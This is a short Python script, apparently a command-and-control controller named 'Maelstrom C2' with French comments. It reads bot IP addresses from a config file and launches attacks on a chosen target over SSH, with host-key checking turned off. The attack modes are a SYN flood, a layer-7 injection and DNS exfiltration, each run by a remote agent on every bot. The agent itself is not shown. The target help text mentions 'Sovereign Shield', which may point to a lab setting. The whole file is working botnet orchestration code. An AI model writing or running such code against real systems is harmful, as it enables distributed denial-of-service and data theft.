import argparse
import subprocess
import json

class MaelstromC2:
    def __init__(self, bot_file):
        with open(bot_file, 'r') as f:
            self.bots = json.load(f) # Charge les IPs des bots Ubuntu

    def broadcast_attack(self, attack_type, target_ip, duration):
        print(f"[*] 🌪️ Orchestrating {attack_type} on {target_ip} for {duration}s...")
        
        for bot in self.bots:
            bot_ip = bot['ip']
            print(f"[+] Deploying module to {bot_ip}...")
            
            # Commande distante à exécuter sur les bots Ubuntu
            # On suppose que les scripts sont déjà dans /tmp/maelstrom sur les bots
            remote_cmd = f"python3 /tmp/maelstrom/agent.py --type {attack_type} --target {target_ip} --time {duration}"
            
            # Exécution via SSH (nécessite des clés SSH partagées pour l'automatisation)
            subprocess.Popen([
                "ssh", "-o", "StrictHostKeyChecking=no", 
                f"user@{bot_ip}", remote_cmd
            ])

    def status(self):
        print(f"[*] Total Bots Connected: {len(self.bots)}")
        for b in self.bots:
            print(f"  - {b['hostname']} ({b['ip']})")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Maelstrom C2 Controller")
    parser.add_argument("--attack", choices=['syn-flood', 'l7-inject', 'dns-exfil'], required=True)
    parser.add_argument("--target", required=True, help="Target IP (Sovereign Shield)")
    parser.add_argument("--duration", type=int, default=60)
    
    args = parser.parse_args()

    # Initialisation avec le fichier de configuration des bots
    c2 = MaelstromC2("config.json")
    c2.status()
    c2.broadcast_attack(args.attack, args.target, args.duration)